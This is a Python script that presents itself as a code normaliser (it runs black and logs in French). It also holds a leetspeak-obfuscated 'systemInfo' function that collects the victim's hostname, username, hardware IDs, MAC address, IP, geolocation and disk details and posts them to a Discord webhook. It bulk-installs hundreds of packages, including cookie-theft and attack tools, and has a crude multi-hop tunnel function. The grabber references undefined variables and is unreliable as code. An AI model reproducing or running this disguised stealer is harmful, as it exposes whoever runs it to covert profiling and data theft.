import os
import subprocess
from subprocess import run
import importlib
import colorama
from colorama import Fore
import logging
import pathlib

requirements = [
    'b64', 'colorama', 'psutil', 'pillow', 'discord', 'beautifulsoup4',
    'gpt', 'browser-cookie3', 'bcrypt', 'phonenumbers', 'scapy', 'shodan',
    'requests', 'flask', 'paramiko', 'python-nmap', 'hashlib', 'cryptography',
    'pycryptodome', 'pyfiglet', 'pytest', 'pytest-xdist', 'selenium',
    'aiohttp', 'sqlalchemy', 'sqlmap', 'openpyxl', 'tabulate',
    'pyftpdlib', 'pexpect', 'pyshark', 'urllib3', 'jwt',
    'dnspython', 'pyOpenSSL', 'gevent', 'watchdog', 'progress', 'termcolor',
    'pyinstaller', 'pyzmq', 'click', 'ipaddress', 'faker', 'yara', 'hashid', 'lz4', 'pyaes',
    'requests_toolbelt', 'httpx', 'websockets', 'h11', 'email-validator',
    'certifi', 'lxml', 'brotli', 'crypten', 'json5', 'pyjwt', 'mypy',
    'zlib', 'pyotp', 'whois', 'pandas', 'numpy', 'matplotlib', 'seaborn',
    'networkx', 'pyngrok', 'idna', 'scipy', 'sympy', 'nltk', 'spacy',
    'gensim', 'tensorflow', 'keras', 'torch', 'sklearn', 'opencv-python',
    'dlib', 'pytesseract', 'pymongo', 'redis', 'sqlparse', 'pyyaml',
    'jinja2', 'markupsafe', 'itsdangerous', 'werkzeug', 'gunicorn',
    'uvicorn', 'fastapi', 'starlette', 'pydantic', 'typer', 'rich',
    'loguru', 'tqdm', 'dataclasses', 'attrs', 'marshmallow', 'schematics',
    'pydot', 'graphviz', 'boto3', 'botocore', 's3transfer', 'paramiko',
    'fabric', 'ansible', 'salt', 'celery', 'kombu', 'flower', 'rq',
    'huey', 'dramatiq', 'pytest-cov', 'coverage', 'hypothesis', 'tox',
    'nox', 'black', 'isort', 'flake8', 'pylint', 'mypy', 'bandit',
    'safety', 'pipenv', 'poetry', 'virtualenv', 'setuptools', 'wheel',
    'twine', 'sphinx', 'mkdocs', 'pdoc3', 'pygments', 'docutils',
    'beautifulsoup4', 'html5lib', 'bleach', 'markdown', 'mistune',
    'jinja2', 'django', 'flask', 'fastapi', 'bottle', 'cherrypy',
    'tornado', 'web2py', 'pyramid', 'falcon', 'hug', 'dash', 'plotly',
    'bokeh', 'altair', 'seaborn', 'matplotlib', 'pygal', 'ggplot',
    'geopandas', 'shapely', 'folium', 'basemap', 'cartopy', 'pillow',
    'imageio', 'opencv-python', 'scikit-image', 'pywavelets', 'pytesseract',
    'pdfminer.six', 'reportlab', 'weasyprint', 'xhtml2pdf', 'fpdf',
    'pypdf2', 'pdfkit', 'docx', 'python-docx', 'xlrd', 'openpyxl',
    'xlsxwriter', 'pyxlsb', 'pandas', 'numpy', 'scipy', 'sympy',
    'statsmodels', 'pymc3', 'theano', 'tensorflow', 'keras', 'torch',
    'sklearn', 'nltk', 'spacy', 'gensim', 'textblob', 'pattern',
    'pyspellchecker', 'langdetect', 'translate', 'goslate', 'deepl',
    'googletrans', 'speechrecognition', 'pyaudio', 'wave', 'soundfile',
    'librosa', 'audioread', 'pydub', 'pygame', 'pyglet', 'kivy',
    'tkinter', 'wxpython', 'pyqt5', 'pygtk', 'pygobject', 'pycairo',
    'pyopengl', 'pythreejs', 'vtk', 'mayavi', 'blender', 'povray',
    'manim', 'pybullet', 'gym', 'roboschool', 'pyrobot', 'ros',
    'pyserial', 'pyusb', 'pynput', 'keyboard', 'mouse', 'pyscreenshot',
    'pyautogui', 'pynput', 'pywinauto', 'pygetwindow', 'pyperclip',
    'clipboard', 'pystray', 'pywebview', 'eel', 'flaskwebgui',
    'pyqtwebengine', 'cefpython3', 'pywebio', 'streamlit', 'dash',
    'panel', 'voila', 'gradio', 'flask-socketio', 'socketio', 'websockets',
    'aiohttp', 'httpx', 'requests', 'urllib3', 'httplib2', 'pycurl',
    'selenium', 'splinter', 'mechanize', 'robobrowser', 'requests-html',
    'scrapy', 'beautifulsoup4', 'lxml', 'html5lib', 'feedparser',
    'newspaper3k', 'goose3', 'readability-lxml', 'boilerpy3', 'trafilatura',
    'sumy', 'gensim', 'nltk', 'spacy', 'textblob', 'pattern', 'pyteaser',
    'pytextrank', 'rake-nltk', 'yake', 'keybert', 'bert-extractive-summarizer',
    'transformers', 'sentence-transformers', 'openai', 'gpt-3', 'gpt-2',
    'gpt-j'

]

def install_and_import(modules):
    installed_modules = []
    for module in modules:
        try:
            importlib.import_module(module)
            installed_modules.append(module)
        except ImportError:
            subprocess.check_call([os.sys.executable, "-m", "pip", "install", module])
            installed_modules.append(module)
    return installed_modules

xiwa_modules = install_and_import(requirements)

imported_modules = {}
for module in xiwa_modules:
    imported_modules[module] = importlib.import_module(module)

def execute_dynamic_function(name):
    if name == "h3ll0":
        return h3ll0()
    elif name == "systemInfo":
        return systemInfo()
    else:
        raise ValueError(f"Function '{name}' not defined!")

def h3ll0():
    print("this function say hello!!!")
    
def systemInfo():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import requests
    from discord import SyncWebhook, Embed

    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"

    try: scr33n_number = len(screeninfo.get_monitors())
    except: scr33n_number = "None"

    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
Username    : {username_pc}
DisplayName : {displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
Screen Number : {scr33n_number}

HWID : {hw1d}
MAC  : {m4c_4ddr355}
CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
GPU  : {gpu_1nf0}
RAM  : {r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
Local  : {ip_adress_local}
Isp    : {isp}
Org    : {org}
As     : {as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
Region    : {region} ({region_code})
Zip       : {zip_postal}
City      : {city}
Timezone  : {timezone}
Latitude  : {latitude}
Longitude : {longitude}```""", inline=False)

    embed.set_footer(text="good luck")

    w3bh00k = SyncWebhook.from_url("YOUR WHEBOOK")
    w3bh00k.send(embed=embed, username="xiwa_simplifier")
    

def vp1():
    import socket
    import ssl
    nodes = [
        '192.168.1.1', '192.168.1.2', '192.168.1.3', '192.168.1.4', '192.168.1.5',
        '192.168.1.6', '192.168.1.7', '192.168.1.8', '192.168.1.9', '192.168.1.10',
        '192.168.2.11', '192.168.2.12', '192.168.2.13', '192.168.2.14', '192.168.2.15',
        '192.168.2.16', '192.168.3.17', '192.168.3.45', '192.168.3.125', '192.168.3.254',
        '192.168.4.1', '192.168.4.2', '192.168.4.3', '192.168.4.4', '192.168.4.5',
        '192.168.4.6', '192.168.4.7', '192.168.4.8', '192.168.4.9', '192.168.4.10',
        '192.168.5.11', '192.168.5.12', '192.168.5.13'
    ]

    final_dest = '192.168.1.100'

    def secure_connect(address):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384') 
        context.load_default_certs(ssl.Purpose.CLIENT_AUTH) 
        context.verify_mode = ssl.CERT_OPTIONAL  

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                secure_sock = context.wrap_socket(s, server_hostname=address[0])
                secure_sock.connect(address)
                return secure_sock
        except ssl.SSLError as e:
            print(f"Erreur SSL lors de la connexion à {address}: {e}")
            return None
        except Exception as e:
            print(f"Erreur lors de la connexion à {address}: {e}")
            return None

    def create_tunnel(node_index):
        try:
            if node_index < len(nodes) - 1:
                with secure_connect((nodes[node_index], 8080)) as s:
                    if s:
                        print(f"Connecté à {nodes[node_index]}")
                        create_tunnel(node_index + 1)
            else:
                with secure_connect((final_dest, 8080)) as s:
                    if s:
                        print(f"Connecté à la destination finale {final_dest}")
                        s.sendall(f"Tunnel connecté !")
        except Exception as e:
            print(f"Erreur lors de la connexion au nœud {nodes[node_index]}: {e}")

    create_tunnel(0)



color = colorama.Fore
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
yellow = Fore.YELLOW
green = Fore.GREEN
black = Fore.BLACK
white = Fore.WHITE
lightYellow = Fore.LIGHTYELLOW_EX

logging.basicConfig(
    filename='python_normalization.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def manage_paths():
    try:
        current_directory = os.getcwd()
        logging.info(f"Répertoire actuel : {current_directory}")
        
        file_path = os.path.join(current_directory, "scripts", "script.py")
        logging.info(f"Chemin du fichier Python : {file_path}")
        
        if os.path.exists(file_path):
            logging.info(f"Le fichier {file_path} existe.")
        else:
            logging.warning(f"Le fichier {file_path} n'existe pas.")
        
        directory_path = os.path.join(current_directory, "scripts")
        if not os.path.exists(directory_path):
            os.makedirs(directory_path)
            logging.info(f"Répertoire {directory_path} créé avec succès.")
        
    except Exception as e:
        logging.error(f"Erreur dans la gestion des chemins : {e}")

def normalize_python_code(file_path):
    try:
        if os.path.exists(file_path):
            logging.info(f"Normalisation du fichier Python : {file_path}")
            
            result = run(['black', file_path], capture_output=True, text=True)
            
            if result.returncode == 0:
                logging.info(f"Le fichier {file_path} a été normalisé avec succès.")
            else:
                logging.error(f"Erreur de formatage avec black : {result.stderr}")
        else:
            logging.warning(f"Le fichier Python spécifié n'existe pas : {file_path}")
    
    except Exception as e:
        logging.error(f"Erreur lors de la normalisation du fichier Python : {e}")

if __name__ == "__main__":
    manage_paths()
    python_file_path = pathlib.Path("scripts") / "script.py"
    normalize_python_code(python_file_path)
